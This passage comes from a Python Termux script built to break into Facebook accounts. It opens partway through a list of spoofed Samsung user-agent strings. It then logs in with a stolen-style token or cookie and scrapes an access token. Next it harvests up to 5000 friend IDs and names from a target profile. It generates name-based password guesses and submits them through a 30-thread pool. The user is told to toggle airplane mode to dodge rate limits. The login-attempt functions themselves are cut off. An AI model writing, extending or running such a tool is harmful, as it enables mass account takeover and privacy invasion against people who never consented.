SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']
# INDICATION
id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]
cp = 0
ok = []
try:
	os.mkdir('/sdcard/')
except:pass
# COLORS
x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
K = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
# Converter 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()

ahsan="ALE-"
imt="-M4786=="
ak="AHSAN-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
############### #LOGO############## ## 

# LOGIN
def Public():
	clear()
	print(logo)
	print  (' [01] Login With Token\n [02] Login With Cookie')
	pil=input('\n [#] Select One : ')
	if pil in ['1','01']:
		panda = input(' [+] Token : ')
		akun=open('.token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			print (" [] Login Successful")
			login()
		except KeyError:
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			Public()
		except requests.exceptions.ConnectionError:
			print ( ' [×] Connection Timeout')
			exit()
	elif pil in ['2','02']:
		try:
			cookie=input(" [+] Cookie : ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			print (" [] Login Successful")
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			login()
			exit()
def public_menu():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	clear()
	print(logo)
	pil = input('\n [+] Enter ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			id.append(pi['id']+'|'+pi['name'])
		print(' [] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print (' [#] Connection Time Out')
		exit()
	except (KeyError,IOError):
		print(' [!] Not public Or Token Expire')
		exit()
def File():
			clear()
			print(logo)
			try:
				fileX = input ('\n [+] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))

def setting():
	hu = ("2")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print (' [!] Choose Correct Option')
		exit()
	clear()
	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
	hc = input ("\n [#] method : ")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	passmenu()
def passmenu():
	clear()
	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
	passmen=input('\n [#] Select Pass : ')
	if passmen in ['1','01']:
		first()
	elif passmen in ['2','02']:
		name()
	elif passmen in ['3','03']:
		name2()
	else:
		passmenu()
		
def first():
	clear()
	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
def name():
	clear()
	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split('|')
				xz = nmf.split(' ')
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
			except:
				pass
def name2():
	clear()
	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'786')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
